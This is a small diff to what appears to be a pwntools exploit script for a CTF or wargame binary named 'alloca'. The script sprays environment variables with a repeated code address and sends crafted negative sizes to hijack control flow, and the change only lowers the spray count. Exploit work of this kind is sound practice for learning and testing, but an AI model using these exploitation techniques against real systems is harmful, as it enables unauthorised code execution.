@@ -6,7 +6,7 @@ from pwn import *
 while True:
     io = process(
         "/home/alloca/alloca",
-        env={"pwn" + str(i): p32(0x80485AB) * 30000 for i in range(20)},
+        env={"pwn" + str(i): p32(0x80485AB) * 30000 for i in range(17)},
     )
     io.sendline(b"-70")
     io.sendline(b"-4718592")
